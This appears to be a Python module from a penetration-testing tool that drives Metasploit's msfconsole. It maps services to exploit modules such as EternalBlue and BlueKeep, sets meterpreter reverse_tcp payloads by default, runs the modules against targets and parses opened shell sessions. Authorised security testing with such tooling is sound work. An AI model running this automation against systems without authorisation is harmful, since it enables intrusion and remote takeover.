"""
Pentronix Metasploit Engine — drives msfconsole via subprocess.

Executes Metasploit modules using the ``msfconsole -q -x "..."`` one-liner
pattern, streams live output to a UI callback, and parses session/exploit
result status. No interactive TTY required — entirely non-interactive.
"""

import asyncio
import re
import shutil
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from utils.logger import get_logger

log = get_logger(__name__)

# ── Common exploit module suggestions for well-known services ─────────────────
_SERVICE_MODULE_MAP: dict[str, list[str]] = {
    "http":     ["auxiliary/scanner/http/http_version",
                 "exploit/multi/handler"],
    "https":    ["auxiliary/scanner/http/ssl_version",
                 "exploit/multi/handler"],
    "ftp":      ["auxiliary/scanner/ftp/anonymous",
                 "exploit/unix/ftp/vsftpd_234_backdoor"],
    "ssh":      ["auxiliary/scanner/ssh/ssh_version",
                 "auxiliary/scanner/ssh/ssh_login"],
    "smb":      ["auxiliary/scanner/smb/smb_ms17_010",
                 "exploit/windows/smb/ms17_010_eternalblue"],
    "rdp":      ["auxiliary/scanner/rdp/rdp_scanner",
                 "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"],
    "mysql":    ["auxiliary/scanner/mysql/mysql_version",
                 "auxiliary/scanner/mysql/mysql_login"],
    "mssql":    ["auxiliary/scanner/mssql/mssql_ping",
                 "auxiliary/admin/mssql/mssql_exec"],
    "postgres": ["auxiliary/scanner/postgres/postgres_version",
                 "auxiliary/scanner/postgres/postgres_login"],
    "telnet":   ["auxiliary/scanner/telnet/telnet_version",
                 "auxiliary/scanner/telnet/telnet_login"],
    "smtp":     ["auxiliary/scanner/smtp/smtp_version"],
    "vnc":      ["auxiliary/scanner/vnc/vnc_none_auth",
                 "auxiliary/scanner/vnc/vnc_login"],
}


@dataclass
class MsfResult:
    """Result from a Metasploit module execution."""
    module: str
    target: str
    command: str
    raw_output: str
    sessions_opened: list[dict] = field(default_factory=list)
    success: bool = False
    status_message: str = ""
    duration_seconds: float = 0.0
    error: str = ""

    def to_report_dict(self) -> dict:
        """Serialise to a plain dict for report generation."""
        return {
            "module": self.module,
            "target": self.target,
            "command": self.command,
            "sessions_opened": self.sessions_opened,
            "success": self.success,
            "status_message": self.status_message,
            "duration_seconds": round(self.duration_seconds, 1),
            "error": self.error,
        }


class MetasploitEngine:
    """Executes Metasploit modules via non-interactive msfconsole.

    Usage::

        engine = MetasploitEngine()
        result = await engine.run_module(
            module="exploit/windows/smb/ms17_010_eternalblue",
            options={"RHOSTS": "192.168.1.10", "LHOST": "192.168.1.5"},
            target="192.168.1.10",
            on_line=print,
        )
    """

    def __init__(self) -> None:
        self._msf_path = shutil.which("msfconsole")
        if not self._msf_path:
            log.warning("msfconsole not found in PATH")
        self._running_process: Optional[asyncio.subprocess.Process] = None

    @property
    def available(self) -> bool:
        """Return True if msfconsole is installed."""
        return self._msf_path is not None

    # ── Main execution entry point ─────────────────────────────────────────────

    async def run_module(
        self,
        module: str,
        options: dict[str, str],
        target: str,
        timeout: int = 300,
        on_line: Optional[Callable[[str], None]] = None,
    ) -> MsfResult:
        """Execute a Metasploit module with the given options.

        Builds a ``msfconsole -q -x`` one-liner with all options set,
        streams stdout, and returns a structured :class:`MsfResult`.

        Args:
            module: Full Metasploit module path (e.g. ``exploit/multi/...``).
            options: Dict of option name → value pairs (RHOSTS, LHOST, etc.).
            target: Human-readable target description for logging.
            timeout: Max execution time in seconds.
            on_line: Callback called with each output line.

        Returns:
            :class:`MsfResult` with parsed outcomes.
        """
        if not self.available:
            return MsfResult(
                module=module,
                target=target,
                command="",
                raw_output="",
                success=False,
                error="msfconsole not found. Install Metasploit Framework.",
            )

        rc_commands = self._build_rc_commands(module, options)
        cmd = [
            self._msf_path,
            "-q",            # quiet — no banner
            "-x", rc_commands,
        ]
        command_str = f"msfconsole -q -x \"{rc_commands}\""
        log.info("Starting msfconsole: module=%s target=%s", module, target)

        t_start = time.monotonic()
        raw_lines: list[str] = []

        try:
            self._running_process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )

            assert self._running_process.stdout is not None

            async def _read() -> None:
                async for raw_bytes in self._running_process.stdout:  # type: ignore[union-attr]
                    line = raw_bytes.decode("utf-8", errors="replace").rstrip()
                    raw_lines.append(line)
                    if on_line:
                        on_line(line)

            try:
                await asyncio.wait_for(_read(), timeout=timeout)
            except asyncio.TimeoutError:
                log.warning("Metasploit timed out after %ds — killing", timeout)
                self._running_process.kill()
                await self._running_process.wait()
                raw = "\n".join(raw_lines)
                return MsfResult(
                    module=module,
                    target=target,
                    command=command_str,
                    raw_output=raw,
                    duration_seconds=time.monotonic() - t_start,
                    success=False,
                    error=f"Timed out after {timeout}s.",
                )

            await self._running_process.wait()

        except (OSError, PermissionError) as exc:
            log.error("msfconsole exec failed: %s", exc)
            return MsfResult(
                module=module,
                target=target,
                command=command_str,
                raw_output="",
                success=False,
                error=str(exc),
            )
        finally:
            self._running_process = None

        raw = "\n".join(raw_lines)
        duration = time.monotonic() - t_start
        sessions, success, status = _parse_msf_output(raw)

        return MsfResult(
            module=module,
            target=target,
            command=command_str,
            raw_output=raw,
            sessions_opened=sessions,
            success=success,
            status_message=status,
            duration_seconds=duration,
        )

    async def search_exploits(
        self,
        search_term: str,
        on_line: Optional[Callable[[str], None]] = None,
    ) -> list[dict]:
        """Search Metasploit's module database for matching exploits.

        Args:
            search_term: Service name, CVE, or keyword.
            on_line: Streaming callback.

        Returns:
            List of exploit dicts with name, rank, description.
        """
        if not self.available:
            return []

        rc_cmd = f"search {search_term}; exit"
        cmd = [self._msf_path, "-q", "-x", rc_cmd]
        log.info("Searching MSF modules: %s", search_term)

        raw_lines: list[str] = []
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            assert proc.stdout is not None
            async for raw in proc.stdout:
                line = raw.decode("utf-8", errors="replace").rstrip()
                raw_lines.append(line)
                if on_line:
                    on_line(line)
            await proc.wait()
        except OSError as exc:
            log.error("MSF search failed: %s", exc)
            return []

        return _parse_msf_search("\n".join(raw_lines))

    async def stop(self) -> None:
        """Kill the running msfconsole process."""
        if self._running_process and self._running_process.returncode is None:
            log.info("Stopping msfconsole (pid=%d)", self._running_process.pid)
            self._running_process.terminate()
            try:
                await asyncio.wait_for(self._running_process.wait(), timeout=5)
            except asyncio.TimeoutError:
                self._running_process.kill()

    def suggest_modules(self, service: str) -> list[str]:
        """Return suggested Metasploit modules for a given service name.

        Args:
            service: Service name string (e.g. "http", "smb").

        Returns:
            List of module path strings.
        """
        return _SERVICE_MODULE_MAP.get(service.lower(), [])

    # ── Internal helpers ───────────────────────────────────────────────────────

    @staticmethod
    def _build_rc_commands(module: str, options: dict[str, str]) -> str:
        """Build the msfconsole -x command string.

        Args:
            module: Module path.
            options: Key/value option dict.

        Returns:
            Semicolon-separated msfconsole commands string.
        """
        parts = [f"use {module}"]
        for key, val in options.items():
            if val:
                parts.append(f"set {key} {val}")
        # Add default PAYLOAD for exploit modules
        if module.startswith("exploit/"):
            if "PAYLOAD" not in options:
                if "windows" in module:
                    parts.append("set PAYLOAD windows/meterpreter/reverse_tcp")
                else:
                    parts.append("set PAYLOAD linux/x86/meterpreter/reverse_tcp")
        parts.append("run -z")   # run and background session
        parts.append("exit -y")
        return "; ".join(parts)


# ── Output parsers ────────────────────────────────────────────────────────────

def _parse_msf_output(raw: str) -> tuple[list[dict], bool, str]:
    """Parse msfconsole output for sessions and success indicators.

    Returns:
        Tuple of (sessions, success_bool, status_message).
    """
    sessions: list[dict] = []
    success = False
    status = "Module completed."

    # Session opened
    sess_re = re.compile(
        r"Meterpreter session (\d+) opened \(([^)]+)\)",
        re.MULTILINE,
    )
    for m in sess_re.finditer(raw):
        sessions.append({"id": m.group(1), "connection": m.group(2)})
        success = True
        status = f"Session {m.group(1)} opened: {m.group(2)}"

    # Command shell session
    shell_re = re.compile(
        r"Command shell session (\d+) opened \(([^)]+)\)",
        re.MULTILINE,
    )
    for m in shell_re.finditer(raw):
        sessions.append({"id": m.group(1), "type": "shell", "connection": m.group(2)})
        success = True
        status = f"Shell session {m.group(1)} opened: {m.group(2)}"

    # Auxiliary success
    if "Auxiliary module execution completed" in raw:
        success = True
        status = "Auxiliary module completed successfully."

    # Exploit failure
    if any(x in raw for x in ["Exploit failed", "No session was created", "[-]"]):
        if not success:
            status = "Exploit did not establish a session — target may be patched."

    return sessions, success, status


def _parse_msf_search(raw: str) -> list[dict]:
    """Parse msfconsole search output into structured exploit list."""
    exploits: list[dict] = []
    # "   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  excellent ..."
    row_re = re.compile(
        r"^\s*\d+\s+([\w/]+)\s+\d{4}-\d{2}-\d{2}\s+(\w+)\s+(.+)$",
        re.MULTILINE,
    )
    for m in row_re.finditer(raw):
        exploits.append({
            "module": m.group(1).strip(),
            "rank": m.group(2).strip(),
            "description": m.group(3).strip()[:120],
        })
    return exploits[:30]


# ── Singleton ─────────────────────────────────────────────────────────────────
_MSF_ENGINE: Optional[MetasploitEngine] = None


def get_msf_engine() -> MetasploitEngine:
    """Return the global :class:`MetasploitEngine` singleton."""
    global _MSF_ENGINE
    if _MSF_ENGINE is None:
        _MSF_ENGINE = MetasploitEngine()
    return _MSF_ENGINE
